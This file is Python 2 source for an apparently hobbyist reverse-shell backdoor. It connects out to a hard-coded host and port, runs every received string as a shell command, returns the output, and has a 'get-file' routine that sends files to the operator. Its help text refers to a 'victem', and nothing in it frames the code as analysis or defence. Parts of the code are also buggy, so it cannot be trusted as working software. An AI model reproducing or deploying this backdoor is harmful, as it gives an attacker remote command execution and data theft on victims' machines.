import socket
import subprocess
import os
import time
HOST = '127.0.0.1'
PORT = 4434
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def File():
    filename = s.recv(1024)
    if os.path.isfile(filename):
        s.send("EXISTS " + str(os.path.getsize(filename)))
        userResponse = s.recv(1024)
        if userResponse[:2] == 'OK':
            print userResponse
            with open(filename, 'rb') as f:
                print filename
                bytesToSend = f.read(1024)
                s.send(bytesToSend)
                while bytesToSend != "":
                    bytesToSend = f.read(1024)
                    s.send(bytesToSend)
                    s.close()
                    return
    else:
        s.send("ERR ")
    s.close()

def Help():
    s.send("hello frend this is you commands you can use for you\n1.type -h for see this massege\n2.type get-file to send a file to the victem\n3.praes on enter to go back to console-EnJiCtOr~>")

def StartShell():
    while True:
        data = s.recv(50480)
        if data > 0:
            if data == '-h':
                Help()
            elif data == 'get-file':
                s.send('we-get')
                File()

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
    s.close()
def main():
    StartShell()
main()
